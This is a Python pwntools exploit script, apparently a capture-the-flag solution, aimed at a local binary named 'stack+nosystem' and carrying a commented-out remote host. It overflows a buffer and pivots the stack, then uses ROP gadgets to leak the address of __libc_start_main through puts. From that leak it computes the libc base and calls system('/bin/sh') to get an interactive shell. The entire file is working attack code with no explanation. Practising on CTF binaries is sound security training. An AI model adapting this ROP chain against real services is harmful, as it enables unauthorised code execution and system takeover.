from pwn import *

# context.log_level = 'debug'
context.terminal = ('open-wsl.exe', "-e")

elf = ELF("./stack+nosystem")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
# libc = ELF("./x64_libc.so.6")
io = process("./stack+nosystem")
# io = remote("everything411.top", 10012)
libc_start_main_got = elf.got["__libc_start_main"]
puts_plt = elf.plt["puts"]
read_got = elf.got["read"]
welcome_addr = elf.symbols["welcome"]
name_addr = elf.symbols["name"]
libc_start_main_offset = libc.symbols["__libc_start_main"]
system_offset = libc.symbols["system"]
rdi_ret = 0x00000000004012c3
rsi_r15_ret = 0x00000000004012c1
rbp_read_addr = 0x401161
binsh_offset = next(libc.search(b"/bin/sh"))


payload = p64(name_addr + 0x100)
payload += p64(rdi_ret) + p64(libc_start_main_got) + p64(puts_plt)
payload += p64(rbp_read_addr)

io.sendafter("name?", payload)
gdb.attach(io)
io.sendafter("time\n", b"A" * 0x100 + p64(name_addr))

puts_recv = io.recv(6)
if len(puts_recv) != 6:
    log.error("NULL byte in libc_start_main_addr")
    io.close()
    exit(0)
libc_start_main_addr = u64(puts_recv[0:6] + b"\x00\x00")
libc_base = libc_start_main_addr - libc_start_main_offset
system_addr = libc_base + system_offset
log.success("libc_start_main_addr %#x, libc_base %#x, system_addr %#x" %
            (libc_start_main_addr, libc_base, system_addr))

payload = p64(0xdeadbeef) * 4
payload += p64(rdi_ret) + p64(libc_base + binsh_offset) 
payload += p64(system_addr)
io.send(payload)

io.interactive()
io.close()
